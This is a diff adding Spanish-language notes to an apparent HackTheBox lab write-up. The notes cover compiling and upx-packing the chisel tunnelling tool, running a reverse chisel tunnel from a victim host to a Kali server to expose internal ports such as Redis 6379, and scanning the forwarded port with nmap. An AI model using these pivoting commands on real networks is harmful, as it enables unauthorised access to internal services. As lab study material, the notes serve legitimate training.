@@ -86,10 +86,44 @@ __curl http://IP/archivo > archivo
 
 ```
 
+# Compilar y bajar de peso el chisel
+
+![image](https://github.com/gecr07/RedishHTB/assets/63270579/847ec256-cfc7-4250-a480-2e1d89d641af)
+
+```
+go build .
+du -hc chisel # Pesa 12 MB
+sudo go build -ldflags "-s -w" .
+sudo upx chisel 
+du -hc chisel # pesa 3 MB!!!
+
+```
+
+## CHISEL PortForwarding
+
+Entonces chisel funciona asi la maquina Kali va a ser el servidor y la maquina victima e cliente.
 
 
+Cliente (victima)
+```
+chisel client IPKALI:1234 R:80:IP_adondequeremosllegar:80
+                          El puerto 80 de este equipo se convierta en el puerto 80 de mi equipo.
+Y no acaba ahi puedes meterle multiples puertos
 
+chisel client IPKALI:1234 R:80:IP_adondequeremosllegar:80 R:6379:172.19.0.2:6379
+Lo ulitmo le dice el puerto 6379 de la ip quiero que se convierta en el puero 6379 de mi computadora.
+```
 
+Servidor (Kali)
+```
+chisel server --reverse -p 1234
+```
+
+Y lo magico es que entonces puedes escanear con nmap porque entonces ahora nada mas especifica el puerto
+
+```
+nmap -sCV -p6379 127.0.0.1 
+```
 
 
 
